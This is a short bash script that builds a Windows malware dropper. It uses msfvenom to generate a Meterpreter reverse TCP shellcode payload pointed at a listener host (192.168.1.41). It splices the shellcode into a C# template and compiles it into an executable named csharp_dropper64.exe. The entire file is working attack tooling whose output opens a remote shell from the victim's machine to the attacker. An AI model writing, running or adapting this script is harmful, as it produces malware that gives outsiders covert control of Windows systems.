#!/bin/bash

SC=`msfvenom -p windows/x64/meterpreter_reverse_tcp -f csharp  --platform windows --arch x64 LHOST=192.168.1.41`


SC=${SC/buf/shellcode}

PRE=`grep -B 1000 INJECT csharp.template | grep -v INJECT`
POST=`grep -A 1000 INJECT csharp.template | grep -v INJECT`

echo "$PRE" > csharp.cs
echo "$SC" >> csharp.cs
echo "$POST" >> csharp.cs

mcs csharp.cs -out:/tmp/csharp_dropper64.exe
chmod 755 /tmp/csharp_dropper64.exe
